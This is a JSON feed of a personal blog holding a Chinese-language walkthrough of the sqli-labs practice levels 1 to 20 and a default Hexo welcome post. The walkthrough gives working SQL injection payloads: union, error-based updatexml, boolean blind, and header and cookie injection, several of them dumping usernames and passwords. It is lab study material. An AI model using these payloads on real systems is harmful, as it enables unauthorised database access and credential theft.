{
    "version": "https://jsonfeed.org/version/1",
    "title": "welcome to my blog",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/04/24/sqli-labs/",
            "url": "http://example.com/2023/04/24/sqli-labs/",
            "title": "",
            "date_published": "2023-04-23T16:32:55.178Z",
            "content_html": "<h3 id=\"怎么判断字符型或者数字型\"><a href=\"#怎么判断字符型或者数字型\" class=\"headerlink\" title=\"怎么判断字符型或者数字型?\"></a>怎么判断字符型或者数字型?</h3><p>数字型:id&#x3D;2和id&#x3D;3-1返回界面相同<br>原理:说明2-1被解析了,旁边没有引号<br>字符型:id&#x3D;2和id&#x3D;2a页面一样就行<br>原理:MySQL等号两边类型不一致会发生强制转换,字符串-&gt;数字</p>\n<p>group_concat是用,连接多行记录的函数</p>\n<p>less1<br>字符型注入<br>看源码:sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”;</p>\n<p>因此:&#x3D;&#x3D;payload:1’   操作   –+&#x3D;&#x3D;</p>\n<p>?id&#x3D;1’ order by 3–+<br>?id&#x3D;1’ order by 4–+<br>?id&#x3D;-1’ union select 1,2,3–+&#x2F;&#x2F;判断回显位<br>?id&#x3D;-1’ union select 1,2,database()–+<br>?id&#x3D;-1’ union select1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+</p>\n<p>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database()–+</p>\n<p>?id&#x3D;-1’ union select 1,group_concat(username),group_concat(password) from users–+</p>\n<p>less2<br>数字型<br>看源码:sql&#x3D;”SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1”;<br>直接输入数字就好,解法与less1相同,去掉less1的’和–+即可</p>\n<p>布尔盲注:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select mid((group_concat(username,0x7e,password) from users),1,1))=&#x27;D&#x27;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>less3<br>id&#x3D;1’)–+</p>\n<p>less4<br>id&#x3D;1”)–+</p>\n<p>less5<br>报错注入:updatexml函数<br>updatexml(xml_doument,XPath_string,new_value)<br>第一个参数：XML的内容<br>第二个参数：是需要update的位置XPATH路径<br>第三个参数：是更新后的内容<br>所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式 ,不对就爆出正确内容<br>可以校验的:0x7e(~),0x5e24(^$),’#’(#)<br>payload:<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,database()),1)–+暴当前数据库</p>\n<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database())),1)–+<br>此时会出现Subquery returns more than 1 row<br>1.可以用limit解决,limit 0,1 1,1 2,1 3,1<br>在limit 3,1找到users表<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database()limit 3,1)),1)–+<br>后面同理爆字段<br>2.加个group_concat解决<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1)–+<br>过程同上<br>最后<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)–+</p>\n<p>substr方法<br>‘ or updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)–+<br>后面把1,31换成32,31<br>63,31<br>94,31</p>\n<p>less6<br>id&#x3D;1” 与less5一样</p>\n<p>less7<br>布尔盲注<br>根据页面回显试探数据,可以二分法,函数:substring(),mid(),substr().<br>eg.?id&#x3D;1’ and (select mid((select concat(user,0x7e,password) from users),1,1))&#x3D;’’–+<br>一直到less10,布尔和时间盲注直接用sqlimap</p>\n<p>less11<br>输入?id&#x3D;1发现url地址没有显示,抓包发现post方式<br>uname&#x3D;11&amp;passwd&#x3D;1&amp;submit&#x3D;Submit<br>判断字符型<br>接下来用基本的union注入就欧克<br>less12<br>“)型,联合注入<br>less13<br>)’ # 加上报错注入<br>less14<br>“# 加上报错注入<br>less15<br>不显示报错信息只能盲注<br>单引号字符型的布尔盲注:<br>1’ –+<br>用脚本less15.py<br>用法:<br>from less15 import *<br>Database15()<br>Tables15()<br>Columns15(‘库’,’表’)<br>Content15(‘库’,’表’,’字段’,’字段’)<br>less16<br>双引号字符型加括号的盲注<br>1”) –+<br>脚本:less16.py</p>\n<p>less17<br>1.注入点在password栏里,单引号字符加报错注入<br>2.先抓包,copy to file,用sqlmap工具<br>python3 sqlmap.py -r 路径 </p>\n<p>less18<br>注入点在user-agent,且用户名密码必须正确<br>注意:闭合之前的部分必须为空,很恶心<br>‘ or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1) or’</p>\n<p>最后:<br>‘ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’</p>\n<p>less19<br>与18一样,注入点在referer</p>\n<p>less20<br>输入正确的用户名和密码,抓到两个包,get包里有cookie,注入点在cookie</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/04/23/hello-world/",
            "url": "http://example.com/2023/04/23/hello-world/",
            "title": "Hello World",
            "date_published": "2023-04-23T15:55:29.640Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}